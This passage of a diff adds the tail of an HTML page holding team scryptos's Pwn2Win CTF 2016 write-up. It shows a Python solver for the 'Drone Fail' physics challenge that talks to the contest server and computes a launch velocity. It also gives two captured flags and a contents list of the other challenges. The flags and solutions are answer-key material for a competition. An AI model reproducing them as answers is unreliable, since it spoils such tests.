+<span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> *
+
+cmd = <span class="hljs-string">"openssl s_client -quiet -connect programming.pwn2win.party:9009"</span>
+p = Popen(cmd, shell=<span class="hljs-keyword">True</span>, stdin=PIPE, stdout=PIPE)
+
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+  s = p.stdout.readline()
+  print(s)
+  G = <span class="hljs-number">6.6740831e-11</span>
+  M = <span class="hljs-number">5.9726e24</span>
+  D, a, R, v = map(float, s.strip().split(<span class="hljs-string">' '</span>))
+  g = G*M/((R*<span class="hljs-number">1000</span>)**<span class="hljs-number">2</span>)
+  t = D / v
+  <span class="hljs-keyword">print</span> <span class="hljs-string">"D = %f"</span> % D
+  <span class="hljs-keyword">print</span> <span class="hljs-string">"a = %f"</span> % a
+  <span class="hljs-keyword">print</span> <span class="hljs-string">"R = %f"</span> % R
+  <span class="hljs-keyword">print</span> <span class="hljs-string">"v = %f"</span> % v
+  <span class="hljs-keyword">print</span> <span class="hljs-string">"g = %f"</span> % g
+  <span class="hljs-keyword">print</span> <span class="hljs-string">"t = %f"</span> % t
+  v_min = (g * a)**<span class="hljs-number">0.5</span> * t
+  ans = <span class="hljs-string">"%.2f\n"</span> % round(v_min,<span class="hljs-number">2</span>)
+  print(ans)
+  p.stdin.write(ans)
+</div></div></code></pre><p>flag: <code>CTF-BR{iT-WaS-jUsT-lAuNch-oBLIqUe-with-GRAVity-W0T6Kmu77}</code></p><h3 id="give-feedback-bonus-25">Give Feedback - Bonus 25<a class="header-link hidden-xs" href="#give-feedback-bonus-25" title="give-feedback-bonus-25"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>give it 5 stars!<br>
+flag: <code>CTF-BR{Thank_you_for_attending_the_pwn2win_party}</code></p></div>
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-right dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-target="#" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+                <div class="toc"><ul class="nav"><li class=""><a href="#pwn2win-ctf-2016-writeup-team-scryptos" smoothhashscroll="">Pwn2Win CTF 2016 writeup (team scryptos)</a><ul class="nav"><li><a href="#skycast-story-10" smoothhashscroll="">Skycast - Story 10</a></li><li><a href="#sum-hello-world-platform-ppc-m-20" smoothhashscroll="">Sum (Hello World Platform) - PPC-M 20</a></li><li><a href="#tokens-pyexp-50" smoothhashscroll="">Tokens - PyExp 50</a></li><li><a href="#g00d-b0y-bonus-10" smoothhashscroll="">g00d b0y - Bonus 10</a></li><li><a href="#square-infinite-spiral-ppc-m-80" smoothhashscroll="">Square Infinite Spiral - PPC-M 80</a></li><li><a href="#sequences-ppc-40" smoothhashscroll="">Sequences - PPC 40</a></li><li><a href="#sleeper-cell-rev-70" smoothhashscroll="">Sleeper cell - Rev 70</a></li><li><a href="#v0t3-web-65" smoothhashscroll="">V0t3 - Web 65</a></li><li><a href="#d3lc1d10-steg-25" smoothhashscroll="">D3lc1d10 - Steg 25</a></li><li><a href="#secure-chat-web-100" smoothhashscroll="">Secure Chat - Web 100</a></li><li><a href="#access-code-net-100" smoothhashscroll="">Access Code - Net 100</a></li><li><a href="#qrgrams-ppc-60" smoothhashscroll="">QRGrams - PPC 60</a></li><li><a href="#electronic-ballot-box-elet-50" smoothhashscroll="">Electronic Ballot Box - Elet 50</a></li><li><a href="#rsa-signature-crypto-200" smoothhashscroll="">RSA Signature - Crypto 200</a></li><li><a href="#death-sequence-ppc-100" smoothhashscroll="">Death Sequence - PPC 100</a></li><li><a href="#drone-fail-phy-40" smoothhashscroll="">Drone Fail - phy 40</a></li><li><a href="#give-feedback-bonus-25" smoothhashscroll="">Give Feedback - Bonus 25</a></li></ul></li></ul></div><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a>
+            </ul>
+        </div>
+    </div>
+    <div id="toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;"  >
+        <div class="toc"><ul class="nav"><li class=""><a href="#pwn2win-ctf-2016-writeup-team-scryptos" smoothhashscroll="">Pwn2Win CTF 2016 writeup (team scryptos)</a><ul class="nav"><li><a href="#skycast-story-10" smoothhashscroll="">Skycast - Story 10</a></li><li><a href="#sum-hello-world-platform-ppc-m-20" smoothhashscroll="">Sum (Hello World Platform) - PPC-M 20</a></li><li><a href="#tokens-pyexp-50" smoothhashscroll="">Tokens - PyExp 50</a></li><li><a href="#g00d-b0y-bonus-10" smoothhashscroll="">g00d b0y - Bonus 10</a></li><li><a href="#square-infinite-spiral-ppc-m-80" smoothhashscroll="">Square Infinite Spiral - PPC-M 80</a></li><li><a href="#sequences-ppc-40" smoothhashscroll="">Sequences - PPC 40</a></li><li><a href="#sleeper-cell-rev-70" smoothhashscroll="">Sleeper cell - Rev 70</a></li><li><a href="#v0t3-web-65" smoothhashscroll="">V0t3 - Web 65</a></li><li><a href="#d3lc1d10-steg-25" smoothhashscroll="">D3lc1d10 - Steg 25</a></li><li><a href="#secure-chat-web-100" smoothhashscroll="">Secure Chat - Web 100</a></li><li><a href="#access-code-net-100" smoothhashscroll="">Access Code - Net 100</a></li><li><a href="#qrgrams-ppc-60" smoothhashscroll="">QRGrams - PPC 60</a></li><li><a href="#electronic-ballot-box-elet-50" smoothhashscroll="">Electronic Ballot Box - Elet 50</a></li><li><a href="#rsa-signature-crypto-200" smoothhashscroll="">RSA Signature - Crypto 200</a></li><li><a href="#death-sequence-ppc-100" smoothhashscroll="">Death Sequence - PPC 100</a></li><li><a href="#drone-fail-phy-40" smoothhashscroll="">Drone Fail - phy 40</a></li><li><a href="#give-feedback-bonus-25" smoothhashscroll="">Give Feedback - Bonus 25</a></li></ul></li></ul></div><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.2/gist-embed.min.js" defer></script>
+    <script>
+        var markdown = $(".markdown-body");
+        //smooth all hash trigger scrolling
+        function smoothHashScroll() {
+            var hashElements = $("a[href^='#']").toArray();
+            for (var i = 0; i < hashElements.length; i++) {
+                var element = hashElements[i];
+                var $element = $(element);
+                var hash = element.hash;
+                if (hash) {
+                    $element.on('click', function (e) {
+                        // store hash
+                        var hash = this.hash;
+                        if ($(hash).length <= 0) return;
+                        // prevent default anchor click behavior
+                        e.preventDefault();
+                        // animate
+                        $('body, html').stop(true, true).animate({
+                            scrollTop: $(hash).offset().top
+                        }, 100, "linear", function () {
+                            // when done, add hash to url
+                            // (default click behaviour)
+                            window.location.hash = hash;
+                        });
+                    });
+                }
+            }
+        }
+
+        smoothHashScroll();
+        var toc = $('.ui-toc');
+        var tocAffix = $('.ui-affix-toc');
+        var tocDropdown = $('.ui-toc-dropdown');
+        //toc
+        tocDropdown.click(function (e) {
+            e.stopPropagation();
+        });
+
+        var enoughForAffixToc = true;
+
+        function generateScrollspy() {
+            $(document.body).scrollspy({
+                target: ''
+            });
+            $(document.body).scrollspy('refresh');
+            if (enoughForAffixToc) {
+                toc.hide();
+                tocAffix.show();
+            } else {
+                tocAffix.hide();
+                toc.show();
+            }
+            $(document.body).scroll();
+        }
+
+        function windowResize() {
+            //toc right
+            var paddingRight = parseFloat(markdown.css('padding-right'));
+            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
+            toc.css('right', right + 'px');
+            //affix toc left
+            var newbool;
+            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
+            //for ipad or wider device
+            if (rightMargin >= 133) {
+                newbool = true;
+                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
+                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
+                tocAffix.css('left', left + 'px');
+            } else {
+                newbool = false;
+            }
+            if (newbool != enoughForAffixToc) {
+                enoughForAffixToc = newbool;
+                generateScrollspy();
+            }
+        }
+        $(window).resize(function () {
+            windowResize();
+        });
+        $(document).ready(function () {
+            windowResize();
+            generateScrollspy();
+        });
+
+        //remove hash
+        function removeHash() {
+            window.location.hash = '';
+        }
+
+        var backtotop = $('.back-to-top');
+        var gotobottom = $('.go-to-bottom');
+
+        backtotop.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToTop)
+                scrollToTop();
+            removeHash();
+        });
+        gotobottom.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToBottom)
+                scrollToBottom();
+            removeHash();
+        });
+
+        function scrollToTop() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: 0
+            }, 100, "linear");
+        }
+
+        function scrollToBottom() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: $(document.body)[0].scrollHeight
+            }, 100, "linear");
+        }
+    </script>
+</body>
+
+</html>
